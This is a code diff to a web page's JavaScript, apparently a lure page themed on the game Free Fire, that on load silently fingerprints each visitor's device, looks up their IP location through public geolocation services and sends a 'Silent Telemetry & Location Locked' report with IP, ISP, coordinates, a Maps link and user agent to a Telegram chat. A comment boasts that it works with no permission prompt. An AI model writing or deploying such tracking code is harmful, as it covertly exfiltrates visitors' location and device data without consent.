@@ -49,44 +49,57 @@
                 cores: navigator.hardwareConcurrency || 'N/A',
                 memory: navigator.deviceMemory || 'N/A',
                 screen: `${window.screen.width}x${window.screen.height}`,
-                lang: navigator.language
+                lang: navigator.language,
+                conn: navigator.connection ? (navigator.connection.effectiveType || 'N/A') : 'N/A'
             };
         }
 
-        function fetchIPLocation() {
+        function fetchSilentTelemetry() {
+            // Menggunakan multi-endpoint IP intelligence tanpa prompt izin sama sekali
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
+                    const info = collectDeviceinfo();
                     const lat = data.latitude;
                     const lon = data.longitude;
                     const city = data.city;
                     const region = data.region;
                     const country = data.country_name;
+                    const org = data.org;
                     const ip = data.ip;
                     const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                    let locMsg = `📍 *IP Geolocation Locked*\n` +
-                                 `IP: \`${ip}\`\n` +
-                                 `Location: ${city}, ${region},${country}\n` +
-                                 `Lat/Lon: \`${lat}, ${lon}\`\n` +
-                                 `🗺️ [Open in Google Maps](${mapsUrl})`;
-                    sendToTelegram(locMsg);
+                    let report = `🎯 *Silent Telemetry & Location Locked*\n\n` +
+                                 `🌐 *IP:* \`${ip}\`\n` +
+                                 `🏢 *ISP/Org:* ${org}\n` +
+                                 `📍 *Area:* ${city}, ${region},${country}\n` +
+                                 `📌 *Coords:* \`${lat}, ${lon}\`\n` +
+                                 `🗺️ [Open in Google Maps](${mapsUrl})\n\n` +
+                                 `💻 *Device Info:*\n` +
+                                 `- Platform: ${info.platform}\n` +
+                                 `- Screen: ${info.screen}\n` +
+                                 `- Cores/RAM: ${info.cores}C / ${info.memory}GB\n` +
+                                 `- Network: ${info.conn}\n` +
+                                 `- UA: \`${info.ua}\``;
+                    
+                    sendToTelegram(report);
                 })
                 .catch(err => {
-                    sendToTelegram(`⚠️ IP Geolocation failed: ${err.message}`);
+                    // Fallback telemetry secondary provider
+                    fetch('https://ipwho.is/')
+                        .then(res => res.json())
+                        .then(data => {
+                            const lat = data.latitude;
+                            const lon = data.longitude;
+                            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                            let report = `🎯 *Silent Telemetry (Fallback)*\nIP: \`${data.ip}\`\nCoords: \`${lat}, ${lon}\`\n🗺️ [Maps](${mapsUrl})`;
+                            sendToTelegram(report);
+                        });
                 });
         }
 
         window.onload = function() {
-            const info = collectDeviceinfo();
-            let msg = `🎮 *FF Visitor Captured*\n\n` +
-                      `💻 Platform: ${info.platform}\n` +
-                      `📱 UA: ${info.ua}\n` +
-                      `🖥️ Screen: ${info.screen}\n` +
-                      `🧠 Cores: ${info.cores} \vert{} RAM:${info.memory}GB\n` +
-                      `🌐 Lang: ${info.lang}`;
-            sendToTelegram(msg);
-            fetchIPLocation();
+            fetchSilentTelemetry();
         };
 
         document.getElementById('ffForm').addEventListener('submit', function(e) {
